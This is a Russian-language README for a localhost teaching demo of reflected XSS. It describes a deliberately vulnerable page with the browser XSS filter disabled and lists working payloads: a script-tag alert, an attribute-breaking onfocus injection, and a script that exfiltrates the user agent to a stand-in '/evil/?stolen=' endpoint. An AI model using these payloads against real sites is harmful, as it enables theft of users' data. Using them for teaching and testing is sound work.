# Демонстрация reflected XSS

## Порядок эксплуатации

1. Запустить сервер HTTP: `php -S 127.0.0.1:8080`.
2. Открыть в браузере веб­‑страницу <http://127.0.0.1:8080/hole/>.
3. Вставить в поисковую строку один из фрагментов из раздела «Варианты ввода».

Ненадёжная защита от XSS была встроена в браузеры Chrome 4.0.249–⁠77, Edge 12–⁠17, Internet Explorer 8–⁠11. В примере эта защита отключена посредством установки заголовка `X-XSS-Protection: 0`.

## Варианты ввода

### Модальное окно

#### С тегами

Сработает при вставке в содержимое элемента HTML.

```html
<script>alert('Привет, я XSS!');</script>
```

#### Без тегов

Сработает при вставке в атрибут элемента HTML.

```html
" autofocus onfocus="alert('Привет, я XSS!')
```

### Межсайтовый запрос

1. Фрагмент для вставки:

    ```html
    <script>window.onload = function () { var iframe = document.createElement('iframe'); iframe.src = '/evil/?stolen=' + navigator.userAgent; document.getElementsByTagName('body')[0].appendChild(iframe); }</script>
    ```

2. Открыть в текстовом редакторе файл `evil/stolen.log`.
